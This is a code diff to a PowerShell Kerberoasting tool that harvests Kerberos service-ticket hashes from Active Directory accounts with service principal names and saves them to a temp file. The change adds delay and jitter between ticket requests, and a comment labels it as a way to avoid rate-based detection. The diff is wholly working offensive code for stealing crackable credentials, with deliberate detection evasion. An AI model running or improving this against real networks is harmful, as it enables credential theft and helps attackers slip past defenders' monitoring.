@@ -30,7 +30,9 @@ param(
     [string]$Target,
     [string]$OutputFile = "$env:TEMP\kerberoast-hashes.txt",
     [switch]$AdminOnly,
-    [string]$DCTarget
+    [string]$DCTarget,
+    [int]$Delay = 0,
+    [ValidateRange(0,100)] [int]$Jitter = 50
 )
 
 $ErrorActionPreference = 'Stop'
@@ -50,6 +52,9 @@ if (-not $DCTarget) {
 
 Write-Host "  [i] Domain : $($domain.Name)" -ForegroundColor Gray
 Write-Host "  [i] DC     : $DCTarget" -ForegroundColor Gray
+if ($Delay -gt 0) {
+    Write-Host "  [i] Delay  : ${Delay}ms (+/- ${Jitter}%)" -ForegroundColor DarkGray
+}
 Write-Host ""
 
 # Stage 1: Discover targets
@@ -119,6 +124,13 @@ $roasted = @{}
 foreach ($s in $spns) {
     # Only roast one SPN per account
     if ($roasted.ContainsKey($s.SAM)) { continue }
+
+    # OPSEC: Jitter between TGS requests to avoid rate-based detection
+    if ($Delay -gt 0 -and $roasted.Count -gt 0) {
+        $range = [int]($Delay * $Jitter / 100)
+        $actual = $Delay + (Get-Random -Minimum (-$range) -Maximum ($range + 1))
+        if ($actual -gt 0) { Start-Sleep -Milliseconds $actual }
+    }
 
     try {
         $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $s.SPN
